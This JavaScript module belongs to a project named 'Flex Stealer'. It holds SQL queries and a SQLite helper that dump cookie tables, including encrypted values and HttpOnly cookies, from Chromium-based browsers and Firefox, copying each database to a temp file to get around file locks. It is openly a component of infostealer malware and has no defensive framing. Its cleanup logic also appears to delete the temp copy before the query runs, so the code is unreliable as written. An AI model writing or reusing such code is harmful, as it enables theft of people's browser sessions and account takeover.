/**
 * database.js — Flex Stealer / Browser Utils
 *
 * Provides a generic SQLite query helper and pre-built SQL query strings
 * for extracting cookies from Chromium-based browsers and Firefox.
 *
 * Exports:
 *   - querySQLiteDatabase(dbPath, sql)  → Promise<Array>
 *   - QUERY_COOKIES                     → SQL string (Chromium cookies table)
 *   - QUERY_FIREFOX_COOKIES             → SQL string (Firefox moz_cookies table)
 */

'use strict';

const sqlite3  = require('sqlite3').verbose();
const { copyToTemp, unixTimestampToDate, getCredentialPrefix } = require('./helpers');

// ---------------------------------------------------------------------------
// SQL Query Constants
// ---------------------------------------------------------------------------

/**
 * Chromium-based browsers (Chrome, Edge, Brave, Opera, …)
 * Database: <Profile>/Cookies
 */
const QUERY_COOKIES = `
  SELECT 
    host_key, 
    name, 
    value, 
    encrypted_value, 
    path, 
    expires_utc, 
    is_secure, 
    is_httponly, 
    creation_utc, 
    last_access_utc 
  FROM cookies
  ORDER BY creation_utc DESC
`;

/**
 * Mozilla Firefox
 * Database: <Profile>/cookies.sqlite
 */
const QUERY_FIREFOX_COOKIES = `
    SELECT host, name, value, path, expiry, isSecure, isHttpOnly, creationTime, lastAccessed
    FROM moz_cookies
`;

// ---------------------------------------------------------------------------
// Generic SQLite Query Helper
// ---------------------------------------------------------------------------

/**
 * Opens a SQLite database file (read-only), runs a query, and returns the
 * resulting rows as a plain array.  The database is closed when done.
 *
 * @param  {string} dbPath  Absolute path to the .db / .sqlite file.
 * @param  {string} sql     SQL SELECT statement to execute.
 * @returns {Promise<Array<object>>} Resolved with the row array, or [] on error.
 */
async function querySQLiteDatabase(dbPath, sql) {
    let db = null;
    let tempPath = null;

    try {
        if (!copyToTemp) return [];

        // Copy the database to a temp location to avoid file-lock conflicts
        tempPath = copyToTemp(dbPath);
        if (!tempPath) return [];

        return new Promise((resolve) => {
            db = new sqlite3.Database(tempPath, sqlite3.OPEN_READONLY, (err) => {
                if (err) { resolve([]); return; }

                db.all(sql, [], (err, rows) => {
                    resolve(err ? [] : (rows || []));
                });
            });
        });

    } catch (_) {
        return [];
    } finally {
        if (db) {
            db.close(() => {
                // Cleanup temp copy after DB is closed
                if (tempPath) {
                    try { require('fs').unlinkSync(tempPath); } catch (_) {}
                }
            });
        } else if (tempPath) {
            try { require('fs').unlinkSync(tempPath); } catch (_) {}
        }
    }
}

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

module.exports = {
    querySQLiteDatabase,
    QUERY_COOKIES,
    QUERY_FIREFOX_COOKIES,
};